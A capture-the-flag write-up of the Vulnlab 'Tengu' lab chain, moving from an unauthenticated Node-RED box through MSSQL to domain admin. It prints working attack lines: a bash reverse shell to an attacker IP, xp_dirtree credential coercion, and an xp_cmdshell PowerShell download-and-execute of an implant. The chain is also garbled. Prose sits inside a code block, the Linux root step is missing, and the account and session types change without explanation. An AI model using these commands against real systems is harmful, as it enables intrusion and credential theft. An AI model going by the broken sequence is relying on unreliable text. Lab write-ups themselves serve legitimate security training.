## Tengu - Windows Active Directory Chain

**Difficulty:** Medium
**Type:** Chain (3 machines)
**Domain:** `tengu.vl`

| Hostname | IP | Role |
|---|---|---|
| `nodered.tengu.vl` | 10.10.186.231 | Linux beachhead, the only publicly reachable box |
| `SQL.tengu.vl` | 10.10.186.230 | Windows, MSSQL server |
| `DC.tengu.vl` | 10.10.186.229 | Windows, Domain Controller |

## Enumeration

### Ports Provided by Vulnlab

This is a chain, so Vulnlab's guidance page gives a head start on which ports are open.

- [https://wiki.vulnlab.com/guidance/medium/tengu-chain](https://wiki.vulnlab.com/guidance/medium/tengu-chain)

```shell
Machine 0x1

Machine 0x2
PORT     STATE SERVICE

Machine 0x3

Not much to go on, so I scanned all three IPs myself to get actual hostnames and service versions.

Only SSH shows up here at first, but the Vulnlab guidance also listed port `1880` on this box, labeled `vsat-control`. That's actually Node-RED hiding behind a generic service name.

With hostnames confirmed, I updated my hosts file.

```

## Foothold on the Beachhead

`nodered.tengu.vl` is the only box we can reach without any credentials, so that's where we start.

### Unauthenticated Node-RED (Port 1880)

Pulling up port 1880 in a browser shows a Node-RED instance, a drag and drop automation tool, and there's no login prompt at all.

- [http://10.10.186.231:1880/](https://10.10.186.231:1880/)

Node-RED flows can embed arbitrary JavaScript, so a Node-RED instance with no auth is basically pre-authenticated remote code execution. There's already a public script that abuses this and drops you into an interactive shell through the Node-RED API.

- [noderedsh.py (gist)](https://gist.githubusercontent.com/qkaiser/79459c3cb5ea6e658701c7d203a8c297/raw/8966e4ee07400f16b92737161ca8df3cbfa37f91/noderedsh.py)

```shell
python3 noderedsh.py http://10.10.186.231:1880
[+] Node-RED does not require authentication.
[+] Establishing RCE link ....
>
```

### Upgrading to a Real Reverse Shell

The shell that script gives you is a bit limited, so I used it to fire off a proper reverse shell one-liner instead, grabbed from revshells.com as usual.

```shell
> /bin/bash -i >& /dev/tcp/10.8.0.2/9001 0>&1
```

Caught it on a listener.

```shell
nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.8.0.2] from (UNKNOWN) [10.10.186.231] 52754
nodered_svc@nodered:/opt/nodered$
```

We land as `nodered_svc`.

### Stabilizing the Shell and Adding an SSH Key

The usual PTY upgrade routine.

```shell
nodered_svc@nodered:/opt/nodered$ python3 -c 'import pty;pty.spawn("/bin/bash")'
^Z
stty raw -echo; fg
export XTERM=xterm
```

While I was at it, I dropped my own public key into `authorized_keys` so I could just SSH in going forward instead of babysitting a reverse shell.

```shell
nodered_svc@nodered:~/.ssh$ echo 'ssh-rsa AAAA...' > authorized_keys
```

```shell
ssh nodered_svc@10.10.186.231

Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-97-generic x86_64)
nodered_svc@nodered:~$
```

## Enumeration as nodered_svc

A quick look at who we are and who else lives on this box.

```shell
nodered_svc@nodered:/opt/nodered$ id
uid=1001(nodered_svc) gid=1001(nodered_svc) groups=1001(nodered_svc)
```

```shell
cat /etc/passwd
...
labadmin:x:1000:1000:labadmin,,,:/home/labadmin:/bin/bash
nodered_svc:x:1001:1001:,,,:/home/nodered_svc:/bin/bash
```

I checked the usual spots, sudo rights, writable files, cron jobs, and came up empty. `nodered_svc` really is just a low-privilege service account. Dead end, at least for now.

## Turning the Tables on Node-RED

Rather than keep digging on the Linux side, I went back to the Node-RED dashboard itself. Node-RED flows can talk out to other services, SMB shares, SQL servers, whatever, and since I already had a shell, I could edit those flows directly.

The idea is simple. If Node-RED is configured to connect out to a database, and I can get it to connect to my machine instead, even briefly, I can catch whatever authentication it sends. Classic man in the middle, just wearing a different hat.

### Step 1, Get It to Authenticate to Us

I edited the SQL node in an existing flow and slipped in a payload that makes SQL Server try to browse a UNC path pointing at my box.

```shell
xp_dirtree '\\10.8.0.2\foobar\';
```

Hit deploy, and Responder, already running in the background, picked up an authentication attempt.

```shell
sudo responder -I tun0
...
[SMB] NTLMv2-SSP Client   : 10.10.186.230
[SMB] NTLMv2-SSP Username : TENGU\gMSA01$
[SMB] NTLMv2-SSP Hash     : gMSA01$::TENGU:REDACTED
```

Got a hash for `gMSA01$`, but gMSA passwords are long random strings managed automatically by AD, so cracking it is a non-starter.

### Step 2, Redirect the Real Connection

Instead I went bigger, edited the flow's actual MSSQL connection node and pointed the "Server" field straight at my attacker box.

- [https://aadinternals.com/post/gmsa/](https://aadinternals.com/post/gmsa/)

Next time the flow ran, the app tried to log into "its database", which was now me, and handed over the credentials in plaintext.

```shell
[MSSQL] Cleartext Client   : 10.10.186.231
[MSSQL] Cleartext Hostname : 10.8.0.2 (Dev)
[MSSQL] Cleartext Username : nodered_connector
[MSSQL] Cleartext Password : REDACTED
```

A working plaintext credential for `nodered_connector`.

## Reaching the Database

### Tunneling Traffic with Chisel

`SQL.tengu.vl` isn't reachable from my attacker box directly, only from the beachhead. Chisel takes care of that with a SOCKS tunnel.

```shell
# on my box
./chisel server -p 9002 -reverse -v
```

```shell
# on the beachhead
./chisel client 10.8.0.2:9002 R:socks
```

With that up, I confirmed I could reach MSSQL through the tunnel.

```shell
proxychains -q netexec mssql 10.10.186.230 -u 'nodered_connector' -p 'REDACTED' --local-auth -q "SELECT @@Version"

MSSQL  10.10.186.230  1433  SQL  [+] nodered_connector:REDACTED
MSSQL  10.10.186.230  1433  SQL  Microsoft SQL Server 2022 (RTM) - 16.0.1000.6 (X64)
```

## Finding and Cracking a Password Hash

Popped a shell into the database with impacket-mssqlclient.

```shell
proxychains -q impacket-mssqlclient nodered_connector:'REDACTED'@SQL.tengu.vl
SQL (nodered_connector  nodered_connector@Dev)>
```

Poking around the available databases and tables.

```shell
SELECT name FROM sys.databases;
-- master, tempdb, model, msdb, Demo, Dev

SELECT table_name from Demo.INFORMATION_SCHEMA.TABLES;
-- Users
```

The `Demo` database has a `Users` table, and sitting right in it is a password hash.

```shell
SELECT * from [Demo].[dbo].Users;
  ID   Username          Password
----   ---------------   -------------------------------------------------------------------
NULL   b't2_m.winters'   b'REDACTED'
```

Before spinning up a cracking rig, I just threw it at crackstation.net on the off chance someone else had already cracked it, and they had. Free password for `t2_m.winters`.

## Extracting Secrets from the Keytab File

Now that I'm root, I went looking around and found `/etc/krb5.keytab`. This is the file that lets the Linux box authenticate to Active Directory as its own computer account, `NODERED$`, no password required. I pulled the secrets out of it with KeyTabExtract.

- [https://github.com/sosdave/KeyTabExtract](https://github.com/sosdave/KeyTabExtract)

```shell
python3 keytabextract.py /etc/krb5.keytab

[+] Keytab File successfully imported.
        REALM : TENGU.VL
        SERVICE PRINCIPAL : NODERED$/
        NTLM HASH : REDACTED
        AES-256 HASH : REDACTED
        AES-128 HASH : REDACTED
```

At this point I'm effectively holding the keys to the `NODERED$` computer account inside AD.

## Mapping Active Directory with BloodHound

Even a machine account's credentials are enough to enumerate the whole domain. Started with a plain user list through NetExec.

```shell
proxychains -q netexec ldap 'dc.tengu.vl' -u 'NODERED$' -H 'REDACTED' --users

[*] Total of records returned 213
Administrator
c.fowler
t2_c.fowler
t1_c.fowler
t0_c.fowler
m.winters
t2_m.winters
t1_m.winters
...
```

Worth noticing the naming pattern, `t0_`, `t1_`, `t2_` prefixes. That's a common real-world way of tiering admin accounts, and `t0` is usually as high as it gets, Domain Admin territory.

Then I let BloodHound do the heavy lifting, since manually tracing permission chains across 213 users is nobody's idea of fun.

```shell
proxychains -q bloodhound-python -u 't2_m.winters' -p 'REDACTED' -d 'tengu.vl' -ns 10.10.186.229 -c ALL --zip

INFO: Found 3 computers
INFO: Found 213 users
INFO: Found 58 groups
INFO: Compressing output into 20240328153643_bloodhound.zip
```

## Reading the gMSA Password

Loading that into BloodHound turned up a nice chain. `NODERED$` is a member of `LINUX_SERVERS@TENGU.VL`, and that group has `ReadGMSAPassword` rights over `gMSA01$`.

Quick refresher on what that actually means. A gMSA, short for Group Managed Service Account, has its password auto rotated by AD, and normally nobody can see it. But if you're a member of the group that's explicitly allowed to read it, you can just ask for it.

```shell
proxychains -q netexec ldap 'dc.tengu.vl' -u 'NODERED$' -H 'REDACTED' --gmsa

LDAP  10.10.186.229  636  DC  Account: gMSA01$  NTLM: REDACTED
LDAP  10.10.186.229  636  DC  Account: gMSA02$  NTLM:
```

Now I've got valid creds for `gMSA01$`.

## Abusing Kerberos Delegation

BloodHound also flagged that `gMSA01$` has `AllowedToDelegate` rights onto `SQL.tengu.vl`, and that `t1_m.winters` sits in `SQL_ADMINS@TENGU.VL`.

In plain terms, this is constrained delegation. A service account with `AllowedToDelegate` on a target is allowed to request a Kerberos ticket on behalf of someone else, but only for that one target. So `gMSA01$` can effectively say "trust me, I'm acting as this other user", and the SQL server has no reason to argue.

```shell
proxychains -q impacket-getST 'tengu.vl/gmsa01$' -spn 'mssqlsvc/sql.tengu.vl' \
  -hashes ':REDACTED' -impersonate 't1_m.winters'

[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in t1_m.winters.ccache
```

Loaded the ticket and used it straight away, no password required at any point.

```shell
export KRB5CCNAME=`realpath t1_m.winters.ccache`

proxychains -q impacket-mssqlclient -k -no-pass SQL.tengu.vl
SQL (TENGU\t1_m.winters  dbo@master)>
```

## Getting Code Execution via MSSQL

Turns out `t1_m.winters` is a SQL admin, which meant I could jump straight to the built-in `sa` login.

```shell
SQL (TENGU\t1_m.winters  dbo@master)> exec_as_login sa
SQL (sa  dbo@master)> enable_xp_cmdshell
```

`xp_cmdshell` is that old SQL Server feature that runs OS commands straight from a query, exactly what we want here. My first attempt with a Metasploit payload ran into a character limit, so I switched over to a Sliver implant instead.

```shell
sliver > generate --mtls 10.8.0.2:8888 --os windows --arch amd64 --disable-sgn --format exe --save /tmp/
sliver > mtls
```

```shell
SQL (sa  dbo@master)> EXEC xp_cmdshell "mkdir C:\temp"
SQL (sa  dbo@master)> EXEC xp_cmdshell "powershell iwr 10.8.0.2/HIGH_COMBINE.exe -o C:\temp\HIGH_COMBINE.exe"
SQL (sa  dbo@master)> EXEC xp_cmdshell "C:\temp\HIGH_COMBINE.exe"
```

And the callback landed.

```shell
[*] Session ca96ccdb HIGH_COMBINE - 10.10.186.230:50591 (SQL) - windows/amd64

sliver (HIGH_COMBINE) > shell
PS C:\Windows\system32> whoami
tengu\gmsa01$
```

Interactive shell on `SQL.tengu.vl` as `gmsa01$`.

## Escalating to SYSTEM

First thing I check on any Windows shell, privileges.

```shell
whoami /all

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
```

`SeImpersonatePrivilege` shows up on service accounts constantly, and it's basically an open invitation for a potato style exploit. The idea is you trick a SYSTEM level service into authenticating to something you control, then steal that authentication token. I reached for GodPotato.

- [https://github.com/BeichenDream/GodPotato/releases](https://github.com/BeichenDream/GodPotato/releases)

```shell
PS C:\temp> .\GodPotato-NET4.exe -cmd 'a.exe'

[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 3364
```

Meterpreter callback comes in with SYSTEM.

```shell
[*] Meterpreter session 2 opened (10.8.0.2:9696 -> 10.10.186.230:50987)

C:\temp>whoami
nt authority\system
```

Second flag, Tengu_User-2, straight off the Administrator's desktop.

```shell
C:\Users\Administrator\Desktop>type root.txt
VL{REDACTED}
```

## Dumping DPAPI Secrets

With SYSTEM in hand, dumping local hashes is trivial.

```shell
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:REDACTED:::
```

Here's where it gets interesting though. Windows' DPAPI is what a lot of apps, browsers, saved credentials, scheduled tasks, use to encrypt secrets tied to a user's login. If you've got the right key material, and sometimes that's just the local Administrator's hash, you can decrypt those secrets without ever knowing the actual plaintext password that protects them.

```shell
proxychains -q netexec smb 'SQL.tengu.vl' -u 'Administrator' -H 'REDACTED' --local-auth --dpapi

[+] Got 4 decrypted masterkeys. Looting secrets...
[SYSTEM][CREDENTIAL] Domain:batch=TaskScheduler:Task:{...} - TENGU\T0_c.fowler:REDACTED
```

| Username | Password |
|---|---|
| T0_c.fowler | REDACTED |

And there it is. `T0_c.fowler` sits in `DOMAIN ADMINS@TENGU.VL`. That's the whole domain, right there.
